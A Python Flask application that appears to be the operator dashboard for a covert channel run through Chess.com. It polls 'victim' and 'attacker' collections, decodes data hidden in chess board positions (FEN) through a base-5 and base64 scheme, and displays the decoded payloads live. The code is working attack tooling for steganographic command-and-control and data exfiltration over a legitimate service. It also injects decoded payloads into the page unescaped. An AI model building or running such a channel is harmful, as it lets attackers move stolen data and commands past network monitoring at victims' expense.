"""
Flask app: POSTs to Chess.com download-pgn every 10s and displays
chess boards for each FEN from the response.
"""
import os
import re
import threading
import time
import base64
import json
from pathlib import Path
from typing import Optional

import chess
import chess.svg
import requests
from dotenv import load_dotenv
from flask import Flask, render_template_string, jsonify

BASE_DIR = Path(__file__).resolve().parents[1]
load_dotenv(BASE_DIR / ".env")

app = Flask(__name__)

# Latest pgns per collection, last fetch time, and lock (updated by background thread)
_pgns_victim = []
_pgns_attacker = []
_last_fetch = 0.0
_lock = threading.Lock()

VICTIM_COLLECTION_ID = os.getenv("VICTIM_COLLECTION_ID", "3186ea38-1cc5-11f1-a1c5-ad1d0ff2ef4e")
ATTACKER_COLLECTION_ID = os.getenv("ATTACKER_COLLECTION_ID", "e6af2a10-1801-11f1-911e-05aff8b4a5dd")


class Base5Chess:
    ALPHABET = "PNBRQ"

    @staticmethod
    def decode(encoded: str) -> bytes:
        if not encoded:
            return b""
        num = 0
        for char in encoded:
            num = num * 5 + Base5Chess.ALPHABET.index(char)
        byte_len = (num.bit_length() + 7) // 8
        return num.to_bytes(byte_len, "big")

    @staticmethod
    def FENToString(fen: str) -> str:
        parts = fen.split("/")
        return "".join(parts[1:7])


def _collection_download_url(collection_id: str) -> str:
    return (
        f"https://www.chess.com/callback/library/collections/"
        f"{collection_id}/actions/download-pgn"
    )


def extract_fen_from_pgn(pgn_text: str) -> Optional[str]:
    """Extract FEN from a PGN string (e.g. [FEN \"7k/...\"])."""
    match = re.search(r'\[FEN\s+"([^"]+)"\]', pgn_text)
    return match.group(1) if match else None


def fen_to_svg(fen: str, size: int = 140) -> str:
    """Render a FEN position as SVG."""
    try:
        board = chess.Board(fen)
        return chess.svg.board(board, size=size)
    except Exception:
        return ""


def decode_fens_payload(fens: list[str]) -> str:
    """
    Rebuild the original payload represented by a sequence of FEN boards,
    following the same logic as chess-agent / chess-listener.
    """
    if not fens:
        return ""

    out = ""
    for fen in fens:
        try:
            out += Base5Chess.FENToString(fen)
        except Exception:
            continue

    b5 = "".join(ch for ch in out.upper() if not ch.isdigit())
    if not b5:
        return ""

    try:
        b64_bytes = Base5Chess.decode(b5)
    except Exception:
        return ""

    # Best-effort: underlying data is base64-encoded bytes
    try:
        b64_str = b64_bytes.decode("utf-8", errors="replace").strip()
    except Exception:
        b64_str = ""

    if not b64_str:
        return ""

    try:
        raw = base64.b64decode(b64_str, validate=False)
        text = raw.decode("utf-8", errors="replace")
    except Exception:
        text = b64_str

    # If it looks like JSON, pretty-print it
    try:
        obj = json.loads(text)
        return json.dumps(obj, indent=2, sort_keys=True)
    except Exception:
        return text


def fetch_pgns(url: str) -> list[str]:
    """POST to Chess.com and return list of PGN strings for the given collection URL."""
    try:
        r = requests.post(
            url,
            headers={
                "Host": "www.chess.com",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                "Accept": "application/json",
                "Content-Type": "application/json",
            },
            json={},
            timeout=15,
        )
        r.raise_for_status()
        data = r.json()
        return data.get("pgns") or []
    except Exception as e:
        print(f"Fetch error {url}: {e}")
        return []


def poll_loop():
    """Background: every 10 seconds, fetch both collections and update _pgns_*."""
    global _pgns_victim, _pgns_attacker, _last_fetch
    victim_url = _collection_download_url(VICTIM_COLLECTION_ID)
    attacker_url = _collection_download_url(ATTACKER_COLLECTION_ID)
    while True:
        pgns_victim = fetch_pgns(victim_url)
        pgns_attacker = fetch_pgns(attacker_url)
        with _lock:
            _pgns_victim = pgns_victim
            _pgns_attacker = pgns_attacker
            _last_fetch = time.time()
        time.sleep(1)


# Start background thread
_thread = threading.Thread(target=poll_loop, daemon=True)
_thread.start()


HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Live · Victim vs Attacker</title>
  <style>
    * { box-sizing: border-box; }
    body {
      font-family: ui-monospace, 'SF Mono', monospace;
      background: #0d0d0d;
      color: #888;
      margin: 0;
      padding: 0;
      min-height: 100vh;
      font-size: 11px;
    }
    .bar {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0.35rem 0.5rem;
      border-bottom: 1px solid #1a1a1a;
    }
    .live {
      color: #2d7d46;
      font-weight: 600;
      letter-spacing: 0.05em;
    }
    .live::before {
      content: '';
      display: inline-block;
      width: 5px;
      height: 5px;
      background: #2d7d46;
      border-radius: 50%;
      margin-right: 6px;
      vertical-align: middle;
      animation: pulse 1.5s ease-in-out infinite;
    }
    @keyframes pulse { 0%,100%{ opacity:1 } 50%{ opacity:0.4 } }
    .split {
      display: flex;
      width: 100%;
      min-height: calc(100vh - 32px);
    }
    .panel {
      flex: 0 0 50%;
      display: flex;
      flex-direction: column;
      border-right: 2px solid #1a1a1a;
      padding: 0.5rem;
      overflow: auto;
    }
    .panel:last-child {
      border-right: none;
    }
    .panel.victim { border-left: 3px solid #c9302c; }
    .panel.attacker { border-left: 3px solid #2d7d46; }
    .panel h2 {
      margin: 0 0 0.5rem 0;
      font-size: 0.9rem;
      font-weight: 600;
      padding-bottom: 0.25rem;
      border-bottom: 1px solid #1f1f1f;
    }
    .panel.victim h2 { color: #c9302c; }
    .panel.attacker h2 { color: #2d7d46; }
    .boards {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(110px, 1fr));
      gap: 0.25rem;
    }
    .cell {
      background: #141414;
      border: 1px solid #1f1f1f;
      border-radius: 4px;
      padding: 4px;
      text-align: center;
    }
    .cell .svg-wrap {
      line-height: 0;
    }
    .cell .svg-wrap svg {
      display: block;
      width: 100%;
      height: auto;
      max-width: 100px;
      margin: 0 auto;
    }
    .cell .idx {
      color: #444;
      margin-top: 2px;
    }
    .empty {
      color: #444;
      font-style: italic;
      padding: 1rem;
    }
    .decoded {
      margin-bottom: 0.5rem;
      padding: 0.35rem 0.45rem;
      background: #101010;
      border: 1px solid #1f1f1f;
      border-radius: 4px;
      max-height: 320px;
      overflow: auto;
      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
      font-size: 10px;
      white-space: pre-wrap;
      word-break: break-word;
    }
    .decoded-title {
      font-size: 0.7rem;
      text-transform: uppercase;
      letter-spacing: 0.08em;
      color: #666;
      margin-bottom: 0.25rem;
    }
  </style>
</head>
<body>
  <div class="bar">
    <span class="live">LIVE</span>
    <span>
      Victim <span id="count-victim">{{ count_victim }}</span>
      ·
      Attacker <span id="count-attacker">{{ count_attacker }}</span>
      · feed 1s
    </span>
  </div>
  <div class="split">
    <div class="panel victim">
      <h2>Victim</h2>
      <div class="decoded" id="victim-decoded">
        <div class="decoded-title">Decoded payload</div>
        {% if decoded_victim %}
          {{ decoded_victim }}
        {% else %}
          <span class="empty">No decodable payload yet…</span>
        {% endif %}
      </div>
      <div class="boards" id="victim-boards">
        {% if boards_victim %}
          {% for board in boards_victim %}
            <div class="cell">
              <div class="svg-wrap">{{ board.svg | safe }}</div>
              <div class="idx">#{{ loop.index }}</div>
            </div>
          {% endfor %}
        {% else %}
          <p class="empty">Waiting for first fetch…</p>
        {% endif %}
      </div>
    </div>
    <div class="panel attacker">
      <h2>Attacker</h2>
      <div class="decoded" id="attacker-decoded">
        <div class="decoded-title">Decoded payload</div>
        {% if decoded_attacker %}
          {{ decoded_attacker }}
        {% else %}
          <span class="empty">No decodable payload yet…</span>
        {% endif %}
      </div>
      <div class="boards" id="attacker-boards">
        {% if boards_attacker %}
          {% for board in boards_attacker %}
            <div class="cell">
              <div class="svg-wrap">{{ board.svg | safe }}</div>
              <div class="idx">#{{ loop.index }}</div>
            </div>
          {% endfor %}
        {% else %}
          <p class="empty">Waiting for first fetch…</p>
        {% endif %}
      </div>
    </div>
  </div>
  <script>
    (function() {
      async function fetchData() {
        try {
          const resp = await fetch("/data", { cache: "no-store" });
          if (!resp.ok) return;
          const data = await resp.json();

          const vBoards = document.getElementById("victim-boards");
          const aBoards = document.getElementById("attacker-boards");
          const vDecoded = document.getElementById("victim-decoded");
          const aDecoded = document.getElementById("attacker-decoded");
          const vCount = document.getElementById("count-victim");
          const aCount = document.getElementById("count-attacker");

          if (vBoards && Array.isArray(data.boards_victim)) {
            let html = "";
            data.boards_victim.forEach((b, idx) => {
              html += '<div class="cell"><div class="svg-wrap">' +
                      b.svg +
                      '</div><div class="idx">#' + (idx + 1) + '</div></div>';
            });
            if (!html) {
              html = '<p class="empty">Waiting for first fetch…</p>';
            }
            vBoards.innerHTML = html;
          }

          if (aBoards && Array.isArray(data.boards_attacker)) {
            let html = "";
            data.boards_attacker.forEach((b, idx) => {
              html += '<div class="cell"><div class="svg-wrap">' +
                      b.svg +
                      '</div><div class="idx">#' + (idx + 1) + '</div></div>';
            });
            if (!html) {
              html = '<p class="empty">Waiting for first fetch…</p>';
            }
            aBoards.innerHTML = html;
          }

          if (vDecoded) {
            const base = '<div class="decoded-title">Decoded payload</div>';
            if (data.decoded_victim) {
              vDecoded.innerHTML = base + data.decoded_victim;
            } else {
              vDecoded.innerHTML = base + '<span class="empty">No decodable payload yet…</span>';
            }
          }

          if (aDecoded) {
            const base = '<div class="decoded-title">Decoded payload</div>';
            if (data.decoded_attacker) {
              aDecoded.innerHTML = base + data.decoded_attacker;
            } else {
              aDecoded.innerHTML = base + '<span class="empty">No decodable payload yet…</span>';
            }
          }

          if (vCount) vCount.textContent = data.count_victim ?? "0";
          if (aCount) aCount.textContent = data.count_attacker ?? "0";
        } catch (e) {
          // ignore errors, retry on next tick
        }
      }

      setInterval(fetchData, 1000);
      fetchData();
    })();
  </script>
</body>
</html>
"""


def _pgns_to_boards(pgns: list) -> list:
    boards = []
    for pgn in pgns:
        fen = extract_fen_from_pgn(pgn)
        if fen:
            svg = fen_to_svg(fen)
            if svg:
                boards.append({"fen": fen, "svg": svg})
    return boards


@app.route("/")
def index():
    with _lock:
        pgns_victim = list(_pgns_victim)
        pgns_attacker = list(_pgns_attacker)
    boards_victim = _pgns_to_boards(pgns_victim)
    boards_attacker = _pgns_to_boards(pgns_attacker)

    fens_victim = [b["fen"] for b in boards_victim]
    fens_attacker = [b["fen"] for b in boards_attacker]

    decoded_victim = decode_fens_payload(fens_victim)
    decoded_attacker = decode_fens_payload(fens_attacker)

    return render_template_string(
        HTML_TEMPLATE,
        boards_victim=boards_victim,
        boards_attacker=boards_attacker,
        count_victim=len(boards_victim),
        count_attacker=len(boards_attacker),
        decoded_victim=decoded_victim,
        decoded_attacker=decoded_attacker,
    )


@app.route("/data")
def data():
    with _lock:
        pgns_victim = list(_pgns_victim)
        pgns_attacker = list(_pgns_attacker)

    boards_victim = _pgns_to_boards(pgns_victim)
    boards_attacker = _pgns_to_boards(pgns_attacker)

    fens_victim = [b["fen"] for b in boards_victim]
    fens_attacker = [b["fen"] for b in boards_attacker]

    decoded_victim = decode_fens_payload(fens_victim)
    decoded_attacker = decode_fens_payload(fens_attacker)

    return jsonify(
        {
            "boards_victim": boards_victim,
            "boards_attacker": boards_attacker,
            "count_victim": len(boards_victim),
            "count_attacker": len(boards_attacker),
            "decoded_victim": decoded_victim,
            "decoded_attacker": decoded_attacker,
        }
    )


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
